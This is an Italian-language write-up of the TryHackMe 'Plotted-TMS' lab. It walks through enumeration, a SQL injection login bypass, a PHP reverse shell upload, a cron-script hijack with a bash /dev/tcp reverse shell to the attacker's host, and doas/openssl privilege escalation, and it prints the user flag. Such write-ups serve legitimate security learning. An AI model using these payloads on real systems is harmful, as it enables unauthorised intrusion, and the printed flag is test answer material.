
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/plottedtms

```
nmap -Pn -v -O -p- 10.10.174.229
```
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds
```

```
nmap -sVC -p22,80,445 10.10.174.229
```
```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:83:19:BA:F1:15 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
http://10.10.174.229:445/
```

```
gobuster dir -u http://10.10.174.229:445/ -w /usr/share/wordlists/dirb/common.txt -t50
```
```
root@ip-10-10-159-7:~# gobuster dir -u http://10.10.174.229:445/ -w /usr/share/wordlists/dirb/common.txt -t50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.174.229:445/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/management           (Status: 301) [Size: 324] [--> http://10.10.174.229:445/management/]
/.htpasswd            (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
root@ip-10-10-159-7:~# gobuster dir -u http://10.10.174.229:80/ -w /usr/share/wordlists/dirb/common.txt -t50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.174.229:80/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.174.229/admin/]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/.hta                 (Status: 403) [Size: 278]
/passwd               (Status: 200) [Size: 25]
/server-status        (Status: 403) [Size: 278]
/shadow               (Status: 200) [Size: 25]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
root@ip-10-10-159-7:~# 

```
andiamo
```
http://10.10.174.229/passwd
```
troviamo
```
bm90IHRoaXMgZWFzeSA6RA==
```

andiamo
```
http://10.10.174.229/shadow
```
troviamo
```
bm90IHRoaXMgZWFzeSA6RA==
```

```
https://gchq.github.io/CyberChef/#recipe=To_Base64('A-Za-z0-9%2B/%3D')
```
base64
```
Ym05MElIUm9hWE1nWldGemVTQTZSQT09
```

http://10.10.174.229/admin/

troviamo un id_rsa
```
VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE
```
non dovrebbe essere utile come anche il passwd e lo shadow di prima ,sembrano delle trappole pe r depistare

vediamo ora cosa cè su
http://10.10.174.229:445/management/

cambiato IP in quanto riavviata la sessione di THM

```
http://10.10.163.22:445/management/
```

troviamo 
```
Traffic Offense Management System
```


```
whatweb http://10.10.163.22:445/management/
```
```
whatweb http://10.10.163.22:445/management/
http://10.10.163.22:445/management/ [200 OK] Apache[2.4.41], Bootstrap[4], Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[oretnom23@gmail.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.163.22], JQuery, Script, Title[Traffic Offense Management System]
```


Analizziamo cosa accade tramite Burp Suite quando proviamo a loggarci

```
POST /management/classes/Login.php?f=login HTTP/1.1
Host: 10.10.163.22:445
User-Agent: J
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 28
Origin: http://10.10.163.22:445
Connection: keep-alive
Referer: http://10.10.163.22:445/management/admin/login.php
Cookie: PHPSESSID=90d7sr575v33lo5p9557c1rubl
Priority: u=0

username=admin&password=1234
```

```
HTTP/1.1 200 OK
Date: Mon, 02 Jun 2025 06:02:06 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 108
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' and password = md5('1234') "}
```

possiamo tentare un attacco SQLi

ora dopo aver provato tramite Intruder di Burp Suite una lista di payload reperiti qui [payload-list](https://github.com/payloadbox/sql-injection-payload-list)

ne ho trovato funzionante il seguente 
```
POST /management/classes/Login.php?f=login HTTP/1.1
Host: 10.10.163.22:445
User-Agent: J
Accept: */*
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 35
Origin: http://10.10.163.22:445
Connection: keep-alive
Referer: http://10.10.163.22:445/management/admin/login.php
Cookie: PHPSESSID=90d7sr575v33lo5p9557c1rubl
Priority: u=0

username=admin'%20%23&password=1234
```

```
HTTP/1.1 200 OK
Date: Mon, 02 Jun 2025 06:07:53 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 20
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"status":"success"}
```

```
admin'#
```
lo inseriamo nel campo admin e mettiamo una password casuale
```
http://10.10.163.22:445/management/admin/login.php
```

eccoci loggati come Admin!

Proviamo a fare una nuova enumerazione su /management  alla ricerca di qualche directory 
proviamo tanto per cambiare un altro strumento ffuf 

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.163.22:445/management/FUZZ
```

```
uploads                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 52ms]
pages                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 51ms]
admin                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 52ms]
assets                  [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 52ms]
plugins                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 52ms]
database                [Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 52ms]
#                       [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 3176ms]
                        [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 4172ms]
# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 4173ms]
# Copyright 2007 James Fisher [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 4173ms]
# directory-list-2.3-medium.txt [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 4175ms]
#                       [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 4176ms]
# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 4178ms]
# This work is licensed under the Creative Commons  [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 4178ms]
classes                 [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 52ms]
dist                    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 55ms]
inc                     [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 53ms]
build                   [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 51ms]
libs                    [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 52ms]
                        [Status: 200, Size: 14506, Words: 2399, Lines: 281, Duration: 60ms]
:: Progress: [220560/220560] :: Job [1/1] :: 769 req/sec :: Duration: [0:04:57] :: Errors: 0 ::

```
abbiamo trovato di interessante la directory /management/uploads.

creiamo un php reverse shell
```
nano revshell.php
```
```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.99.134/1234 0>&1'");
```

ci mettiamo in ascolto
```
nc -lvnp 1234
```
e carichiamo in  Potal Cover un semplice file di php-reverse-shell 
http://10.10.163.22:445/management/admin/?page=system_info

ed otteniamo la revshell!

```
└─# nc -lvnp 1234         
listening on [any] 1234 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.163.22] 56536
bash: cannot set terminal process group (1635): Inappropriate ioctl for device
bash: no job control in this shell
www-data@plotted:/var/www/html/445/management/uploads$ 
```

stabilizziamo la shell
```
perl -e 'exec "/bin/bash";'
```
non è possibile fare altro , dobbiamo scalare i privilegi

vediamo se ci sono cronjob in esecuzione
```
cat /etc/crontab
```

```
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *  root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *  root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7  root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *  root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *  plot_admin /var/www/scripts/backup.sh

```

troviamo interessante plot_admin /var/www/scripts/backup.sh
vediamo che permessi abbiamo
```
ls -al /var/www/scripts/
```
possiamo scrivere nella cartella

creiamo un file di ==reverse shell== bash direttamente nel terminale vittima

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.14.99.134/5555 0>&1' > backup.sh
```
diamo i permessi di esecuzione
```
chmod +x backup.sh
```

ci mettiamo in ascolto sulla nostra macchina attaccante in attesa che si esegua il cronjob
```
nc -lvnp 5555
```
otteniamo la revshell
```
└─# nc -lvnp 5555             
listening on [any] 5555 ...
connect to [10.14.99.134] from (UNKNOWN) [10.10.163.22] 35952
bash: cannot set terminal process group (45320): Inappropriate ioctl for device
bash: no job control in this shell
plot_admin@plotted:~$ 

```

```
ls /home/plot_admin
```

```
plot_admin@plotted:~$ ls /home/plot_admin
ls /home/plot_admin
tms_backup
user.txt
```

```
cat /home/plot_admin/user.txt
```

```
plot_admin@plotted:~$ cat /home/plot_admin/user.txt
cat /home/plot_admin/user.txt
77927510d5edacea1f9e86602f1fbadb
```
otteniamo la flag user
```
77927510d5edacea1f9e86602f1fbadb
```

**Ora cerchiamo di diventare root**

cerchiamo i binari SUID
```bash
find / -perm -u=s -type f 2>/dev/null;
```

```
/snap/core18/2284/bin/mount
/snap/core18/2284/bin/ping
/snap/core18/2284/bin/su
/snap/core18/2284/bin/umount
/snap/core18/2284/usr/bin/chfn
/snap/core18/2284/usr/bin/chsh
/snap/core18/2284/usr/bin/gpasswd
/snap/core18/2284/usr/bin/newgrp
/snap/core18/2284/usr/bin/passwd
/snap/core18/2284/usr/bin/sudo
/snap/core18/2284/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2284/usr/lib/openssh/ssh-keysign
/snap/core18/2246/bin/mount
/snap/core18/2246/bin/ping
/snap/core18/2246/bin/su
/snap/core18/2246/bin/umount
/snap/core18/2246/usr/bin/chfn
/snap/core18/2246/usr/bin/chsh
/snap/core18/2246/usr/bin/gpasswd
/snap/core18/2246/usr/bin/newgrp
/snap/core18/2246/usr/bin/passwd
/snap/core18/2246/usr/bin/sudo
/snap/core18/2246/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2246/usr/lib/openssh/ssh-keysign
/snap/core20/1328/usr/bin/chfn
/snap/core20/1328/usr/bin/chsh
/snap/core20/1328/usr/bin/gpasswd
/snap/core20/1328/usr/bin/mount
/snap/core20/1328/usr/bin/newgrp
/snap/core20/1328/usr/bin/passwd
/snap/core20/1328/usr/bin/su
/snap/core20/1328/usr/bin/sudo
/snap/core20/1328/usr/bin/umount
/snap/core20/1328/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1328/usr/lib/openssh/ssh-keysign
/snap/core20/1169/usr/bin/chfn
/snap/core20/1169/usr/bin/chsh
/snap/core20/1169/usr/bin/gpasswd
/snap/core20/1169/usr/bin/mount
/snap/core20/1169/usr/bin/newgrp
/snap/core20/1169/usr/bin/passwd
/snap/core20/1169/usr/bin/su
/snap/core20/1169/usr/bin/sudo
/snap/core20/1169/usr/bin/umount
/snap/core20/1169/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1169/usr/lib/openssh/ssh-keysign
/snap/snapd/14549/usr/lib/snapd/snap-confine
/snap/snapd/13640/usr/lib/snapd/snap-confine
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/at
/usr/bin/chsh
/usr/bin/umount
/usr/bin/doas
/usr/bin/newgrp
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
plot_admin@plotted:~$ 
```

dopo un po di prove troviamo 
```
/usr/bin/doas
```
 è un sostituto del comando sudo sviluppato per i sistemi OpenBSD

la configurazione dei privilegi privilegi è scritta nel file `/etc/doas.conf`

```
cat /etc/doas.conf
```
troviamo scritto
```
permit nopass plot_admin as root cmd openssl
```

l'utente plot_admin può eseguire OpenSSL come root senza password

controlliamo come utilizzare il tutto su https://gtfobins.github.io/gtfobins/openssl/

la cosa più rapida per ottenere la flag è semplicemente leggerla senza complicarci la vita con ulteriori revshell
```
doas openssl enc -base64 -in /root/root.txt | base64 -d
```

```
doas openssl enc -base64 -in /root/root.txt | base64 -d
Congratulations on completing this room!

xxxxxxxxxxxxxxxxxxx

Hope you enjoyed the journey!

Do let me know if you have any ideas/suggestions for future rooms.
-sa.infinity8888

```
ecco la root flag!
```
xxxxxxxxxxxxxxxxxxxx
```

